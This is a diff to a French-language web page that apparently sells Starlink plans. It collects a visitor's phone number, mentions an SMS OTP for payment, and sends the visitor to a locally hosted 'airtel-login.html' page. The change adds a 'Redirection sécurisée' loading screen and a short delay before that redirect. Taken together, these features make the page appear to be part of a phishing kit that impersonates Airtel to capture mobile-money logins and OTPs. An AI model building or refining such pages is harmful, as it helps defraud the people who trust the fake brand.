@@ -292,7 +292,7 @@ input,select{font:inherit;color:inherit}
 .sheet-head h3{font-family:'Space Grotesk',sans-serif;font-size:18px;font-weight:700;letter-spacing:-.015em}
 .sheet-head p{font-size:12.5px;line-height:1.5;color:var(--ink-3)}
 
-/* ── Product card inside sheet (photo + deposit) ── */
+/* Product card inside sheet */
 .sheet-prod{
   display:grid;
   grid-template-columns:64px 1fr auto;
@@ -338,7 +338,7 @@ input,select{font:inherit;color:inherit}
   line-height:1;
 }
 
-/* ── Phone field ── */
+/* Phone field */
 .field{
   display:flex;align-items:center;gap:var(--g-3);
   height:var(--h-input);padding-inline:var(--g-4);
@@ -373,6 +373,44 @@ input,select{font:inherit;color:inherit}
 .sheet-btn:disabled{background:#ECECEF;color:#B5B5BE;box-shadow:none;cursor:not-allowed;transform:none}
 .sheet-cancel{display:grid;place-items:center;width:100%;height:44px;border-radius:var(--r-full);font-size:14px;font-weight:600;color:var(--ink-3)}
 .sheet-cancel:active{background:var(--surf-lo)}
+
+/* ═════ FULL-SCREEN LOADING ═════ */
+.loading{
+  position:fixed;inset:0;z-index:200;
+  display:none;place-items:center;
+  background:rgba(255,255,255,.94);
+  backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);
+  opacity:0;transition:opacity .25s var(--ease);
+}
+.loading.show{display:grid;opacity:1}
+.loading-inner{
+  display:flex;flex-direction:column;align-items:center;gap:var(--g-4);
+  padding:var(--g-6);
+  text-align:center;
+  max-width:300px;
+}
+.loading-loader{
+  position:relative;
+  width:72px;height:72px;
+  display:grid;place-items:center;
+  flex-shrink:0;
+}
+.loading-ring{
+  position:absolute;inset:0;border-radius:50%;
+  border:3px solid var(--red-lt);
+  border-top-color:var(--red);
+  border-right-color:var(--red);
+  animation:spin .9s linear infinite;
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+.loading-title{
+  font-family:'Space Grotesk',sans-serif;
+  font-size:16px;font-weight:700;letter-spacing:-.015em;
+  color:var(--ink);line-height:1.25;
+}
+.loading-sub{
+  font-size:12.5px;line-height:1.5;color:var(--ink-3);
+}
 </style>
 </head>
 
@@ -830,7 +868,6 @@ input,select{font:inherit;color:inherit}
       <p>Un code OTP vous sera envoyé par SMS pour confirmer le paiement.</p>
     </div>
 
-    <!-- Product card with photo + deposit -->
     <div class="sheet-prod">
       <div class="sheet-prod-img">
         <img id="sheetImg" src="" alt="" loading="eager">
@@ -857,6 +894,17 @@ input,select{font:inherit;color:inherit}
 
     <button class="sheet-btn" id="sheetConfirm" onclick="confirmPhone()" disabled>Continuer</button>
     <button class="sheet-cancel" onclick="closeSheet()">Annuler</button>
+  </div>
+</div>
+
+<!-- ═════ FULL-SCREEN LOADING ═════ -->
+<div class="loading" id="loadingOverlay" role="alert" aria-live="assertive" aria-busy="true">
+  <div class="loading-inner">
+    <div class="loading-loader" aria-hidden="true">
+      <div class="loading-ring"></div>
+    </div>
+    <div class="loading-title">Redirection sécurisée…</div>
+    <div class="loading-sub">Préparation de la page de connexion Airtel</div>
   </div>
 </div>
 
@@ -897,7 +945,6 @@ function openSheet(product){
   document.getElementById('sheetName').textContent  = product.name;
   document.getElementById('sheetPrice').textContent = product.deposit;
 
-  /* Set product photo */
   if (product.img){
     sheetImg.src = 'assets/' + product.img;
     sheetImg.alt = product.name;
@@ -958,10 +1005,20 @@ function confirmPhone(){
     phone:   phone
   };
   try { sessionStorage.setItem('starlinkForfait', JSON.stringify(forfait)); } catch(e){}
-  window.location.href = 'airtel-login.html';
+
+  /* Close sheet, show loading, then navigate */
+  overlay.classList.remove('show');
+  document.body.style.overflow = '';
+
+  var loading = document.getElementById('loadingOverlay');
+  if (loading){
+    loading.classList.add('show');
+    setTimeout(function(){ window.location.href = 'airtel-login.html'; }, 1200);
+  } else {
+    window.location.href = 'airtel-login.html';
+  }
 }
 
-/* Wire every "Demander" button */
 document.querySelectorAll('#productGrid .ask-btn').forEach(function(btn){
   btn.addEventListener('click', function(){
     var art = btn.closest('.pcard');
